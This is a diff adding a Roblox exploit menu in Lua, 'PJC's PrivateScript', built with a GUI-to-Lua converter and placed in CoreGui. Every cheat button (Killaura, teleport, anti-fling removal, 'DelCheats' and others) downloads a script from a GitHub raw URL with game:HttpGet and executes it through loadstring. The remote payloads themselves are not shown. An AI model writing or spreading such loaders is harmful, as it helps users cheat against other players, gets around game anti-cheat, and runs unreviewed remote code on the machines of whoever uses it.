@@ -1,0 +1,356 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local PlayerImage = Instance.new("ImageLabel")
+local PlayerName = Instance.new("TextLabel")
+local TextLabel = Instance.new("TextLabel")
+local Frame_3 = Instance.new("Frame")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local Killa = Instance.new("TextButton")
+local Die = Instance.new("TextButton")
+local TP = Instance.new("TextButton")
+local rub = Instance.new("TextButton")
+local spawn = Instance.new("TextButton")
+local anti = Instance.new("TextButton")
+local ByeAnti = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local shoutouttoxeqctedjoedeezandeluforbeingmykittens3 = Instance.new("TextLabel")
+local Frame_4 = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.fromRGB(104, 143, 46)
+Frame.BorderColor3 = Color3.fromRGB(53, 51, 27)
+Frame.BorderSizePixel = 4
+Frame.Position = UDim2.new(0.681188107, 0, 0.533599019, 0)
+Frame.Size = UDim2.new(0, 257, 0, 272)
+Frame.Style = Enum.FrameStyle.DropShadow
+
+Frame_2.Parent = Frame
+Frame_2.Active = true
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.BackgroundTransparency = 1.000
+Frame_2.BorderColor3 = Color3.fromRGB(53, 51, 27)
+Frame_2.BorderSizePixel = 4
+Frame_2.Position = UDim2.new(0.674161673, 0, -0.00724301813, 0)
+Frame_2.Size = UDim2.new(0, 65, 0, 64)
+
+PlayerImage.Name = "PlayerImage"
+PlayerImage.Parent = Frame_2
+PlayerImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayerImage.BackgroundTransparency = 1.000
+PlayerImage.Position = UDim2.new(0.246153846, 0, 0, 0)
+PlayerImage.Size = UDim2.new(0, 65, 0, 63)
+PlayerImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+PlayerName.Name = "PlayerName"
+PlayerName.Parent = Frame_2
+PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.BackgroundTransparency = 1.000
+PlayerName.Position = UDim2.new(-0.466047525, 0, 1.234375, 0)
+PlayerName.Size = UDim2.new(0, 98, 0, 50)
+PlayerName.Font = Enum.Font.SourceSans
+PlayerName.TextColor3 = Color3.fromRGB(0, 0, 0)
+PlayerName.TextScaled = true
+PlayerName.TextSize = 14.000
+PlayerName.TextWrapped = true
+
+TextLabel.Parent = Frame_2
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(-1, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 59, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Welcome"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 18.000
+TextLabel.TextWrapped = true
+
+Frame_3.Parent = Frame
+Frame_3.Active = true
+Frame_3.BackgroundColor3 = Color3.fromRGB(157, 7, 9)
+Frame_3.BorderColor3 = Color3.fromRGB(53, 51, 27)
+Frame_3.BorderSizePixel = 4
+Frame_3.Position = UDim2.new(-0.00329708401, 0, -0.033565972, 0)
+Frame_3.Size = UDim2.new(0, 85, 0, 144)
+Frame_3.Style = Enum.FrameStyle.RobloxRound
+
+ScrollingFrame.Parent = Frame_3
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.Position = UDim2.new(0.114659205, 0, 0.055555556, 0)
+ScrollingFrame.Size = UDim2.new(0, 77, 0, 128)
+ScrollingFrame.CanvasPosition = Vector2.new(0, 132.999969)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 2, 5)
+
+Killa.Name = "Killa"
+Killa.Parent = ScrollingFrame
+Killa.BackgroundColor3 = Color3.fromRGB(255, 228, 73)
+Killa.Position = UDim2.new(-0.00705853011, 0, 0.0919108316, 0)
+Killa.Size = UDim2.new(0, 61, 0, 41)
+Killa.Style = Enum.ButtonStyle.RobloxRoundButton
+Killa.Font = Enum.Font.SourceSans
+Killa.Text = "Enable Killaura (Use slot2)"
+Killa.TextColor3 = Color3.fromRGB(0, 0, 0)
+Killa.TextSize = 14.000
+Killa.TextWrapped = true
+Killa.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/source%20joe", true))()
+end)
+
+Die.Name = "Die"
+Die.Parent = ScrollingFrame
+Die.BackgroundColor3 = Color3.fromRGB(255, 228, 73)
+Die.BorderColor3 = Color3.fromRGB(44, 53, 39)
+Die.Position = UDim2.new(-0.00705882628, 0, 0.249698505, 0)
+Die.Size = UDim2.new(0, 45, 0, 25)
+Die.Style = Enum.ButtonStyle.RobloxRoundButton
+Die.Font = Enum.Font.SciFi
+Die.Text = "End"
+Die.TextColor3 = Color3.fromRGB(0, 0, 0)
+Die.TextSize = 14.000
+Die.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/why%20ded", true))()
+end)
+
+TP.Name = "TP"
+TP.Parent = ScrollingFrame
+TP.BackgroundColor3 = Color3.fromRGB(255, 228, 73)
+TP.Position = UDim2.new(0.00476470869, 0, -0.00129133463, 0)
+TP.Size = UDim2.new(0, 57, 0, 25)
+TP.Style = Enum.ButtonStyle.RobloxRoundButton
+TP.Font = Enum.Font.SourceSans
+TP.Text = "EnableTP"
+TP.TextColor3 = Color3.fromRGB(0, 0, 0)
+TP.TextSize = 14.000
+TP.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/my%20cock%20is%20hard", true))()
+end)
+
+rub.Name = "rub"
+rub.Parent = ScrollingFrame
+rub.BackgroundColor3 = Color3.fromRGB(255, 46, 10)
+rub.Position = UDim2.new(-0.0235294122, 0, 0.345713735, 0)
+rub.Size = UDim2.new(0, 72, 0, 28)
+rub.Style = Enum.ButtonStyle.RobloxRoundButton
+rub.Font = Enum.Font.SourceSans
+rub.Text = "Ruby"
+rub.TextColor3 = Color3.fromRGB(0, 0, 0)
+rub.TextSize = 14.000
+rub.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/ruby", true))()
+end)
+
+spawn.Name = "spawn"
+spawn.Parent = ScrollingFrame
+spawn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+spawn.Position = UDim2.new(-0.0235294122, 0, 0.42859745, 0)
+spawn.Size = UDim2.new(0, 77, 0, 50)
+spawn.Style = Enum.ButtonStyle.RobloxRoundButton
+spawn.Font = Enum.Font.SourceSans
+spawn.Text = "PG"
+spawn.TextColor3 = Color3.fromRGB(0, 0, 0)
+spawn.TextSize = 10.000
+spawn.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Randomman12345/random/main/i%20hate%20you", true))()
+end)
+
+anti.Name = "anti"
+anti.Parent = ScrollingFrame
+anti.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+anti.Position = UDim2.new(-0.105882354, 0, 0.603674889, 0)
+anti.Size = UDim2.new(0, 82, 0, 50)
+anti.Style = Enum.ButtonStyle.RobloxRoundButton
+anti.Font = Enum.Font.SourceSans
+anti.Text = "DelAntiFling"
+anti.TextColor3 = Color3.fromRGB(0, 0, 0)
+anti.TextSize = 14.000
+anti.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Randomman12345/random/main/lol", true))()
+end)
+
+ByeAnti.Name = "ByeAnti"
+ByeAnti.Parent = ScrollingFrame
+ByeAnti.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ByeAnti.Position = UDim2.new(-0.0352941155, 0, 0.751660347, 0)
+ByeAnti.Size = UDim2.new(0, 74, 0, 50)
+ByeAnti.Style = Enum.ButtonStyle.RobloxRoundButton
+ByeAnti.Font = Enum.Font.SourceSans
+ByeAnti.Text = "DelCheats"
+ByeAnti.TextColor3 = Color3.fromRGB(0, 0, 0)
+ByeAnti.TextSize = 14.000
+ByeAnti.MouseButton1Click:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Randomman12345/random/main/xdd", true))()
+end)
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0, 0, 0.531089783, 0)
+TextLabel_2.Size = UDim2.new(0, 118, 0, 66)
+TextLabel_2.Font = Enum.Font.Ubuntu
+TextLabel_2.Text = "PJC's PrivateScript"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(0.560182571, 0, 0.704442859, 0)
+ImageLabel.Size = UDim2.new(0, 110, 0, 70)
+ImageLabel.Image = "rbxassetid://10552103524"
+
+TextLabel_3.Parent = Frame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderColor3 = Color3.fromRGB(255, 246, 247)
+TextLabel_3.Position = UDim2.new(0, 0, 0.80334723, 0)
+TextLabel_3.Size = UDim2.new(0, 142, 0, 50)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "A skid named enura#1707 made this possible"
+TextLabel_3.TextColor3 = Color3.fromRGB(253, 253, 253)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.Name = "shoutout to xeqcted, joe deez and elu for being my kittens :3"
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.Parent = Frame
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.BackgroundTransparency = 1.000
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.Position = UDim2.new(0.580645144, 0, 0.497907937, 0)
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.Size = UDim2.new(0, 91, 0, 50)
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.Font = Enum.Font.PatrickHand
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.Text = "shoutout to aegeus, elus, xeqcted, joe deez  & thezarix"
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.TextColor3 = Color3.fromRGB(0, 0, 0)
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.TextScaled = true
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.TextSize = 14.000
+shoutouttoxeqctedjoedeezandeluforbeingmykittens3.TextWrapped = true
+
+Frame_4.Parent = Frame
+Frame_4.Active = true
+Frame_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_4.Position = UDim2.new(-0.0345349908, 0, -0.214130849, 0)
+Frame_4.Size = UDim2.new(0, 112, 0, 53)
+Frame_4.ZIndex = 0
+Frame_4.Style = Enum.FrameStyle.DropShadow
+
+TextBox.Parent = Frame_4
+TextBox.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
+TextBox.BackgroundTransparency = 0.500
+TextBox.Position = UDim2.new(0.0854590163, 0, 0.209641367, 0)
+TextBox.Size = UDim2.new(0, 79, 0, 23)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = "V2"
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14.000
+
+-- Scripts:
+
+local function UTQR_fake_script() -- Frame_2.LocalScript 
+	local script = Instance.new('LocalScript', Frame_2)
+
+	local frame = script.Parent
+	
+	
+	
+	local player = game.Players.LocalPlayer
+	
+	
+	
+	local userId = player.UserId
+	
+	local thumbType = Enum.ThumbnailType.AvatarBust
+	
+	local thumbSize = Enum.ThumbnailSize.Size420x420
+	
+	local content, isReady = game.Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+	
+	
+	
+	
+	
+	frame.PlayerImage.Image = content
+	
+	frame.PlayerName.Text = player.Name
+end
+coroutine.wrap(UTQR_fake_script)()
+local function FJIA_fake_script() -- Killa.KillaScript 
+	local script = Instance.new('LocalScript', Killa)
+
+	Killa.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/source%20joe", true))()
+	end)
+end
+coroutine.wrap(FJIA_fake_script)()
+local function DLUSSJN_fake_script() -- Die.DieScript 
+	local script = Instance.new('LocalScript', Die)
+
+	Die.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/why%20ded", true))()
+	end)
+end
+coroutine.wrap(DLUSSJN_fake_script)()
+local function FLPYO_fake_script() -- TP.EnableTPScript 
+	local script = Instance.new('LocalScript', TP)
+
+	TP.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/my%20cock%20is%20hard", true))()
+	end)
+end
+coroutine.wrap(FLPYO_fake_script)()
+local function RETM_fake_script() -- rub.LocalScript 
+	local script = Instance.new('LocalScript', rub)
+
+	rub.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/enuraa/joe-deez-wasnt-here/main/ruby", true))()
+	end)
+end
+coroutine.wrap(RETM_fake_script)()
+local function JZLLQ_fake_script() -- spawn.UlyScript 
+	local script = Instance.new('LocalScript', spawn)
+
+	spawn.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Randomman12345/random/main/i%20hate%20you", true))()
+	end)
+end
+coroutine.wrap(JZLLQ_fake_script)()
+local function NJEIP_fake_script() -- anti.AntiFlingScript 
+	local script = Instance.new('LocalScript', anti)
+
+	anti.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Randomman12345/random/main/lol", true))()
+	end)
+end
+coroutine.wrap(NJEIP_fake_script)()
+local function MGSXP_fake_script() -- ByeAnti.DelCheatScript 
+	local script = Instance.new('LocalScript', ByeAnti)
+
+	ByeAnti.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Randomman12345/random/main/xdd", true))()
+	end)
+end
+coroutine.wrap(MGSXP_fake_script)()
+local function SKEKO_fake_script() -- Frame.MainScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	script.Parent.Active = true
+	script.Parent.Draggable = true
+end
+coroutine.wrap(SKEKO_fake_script)()
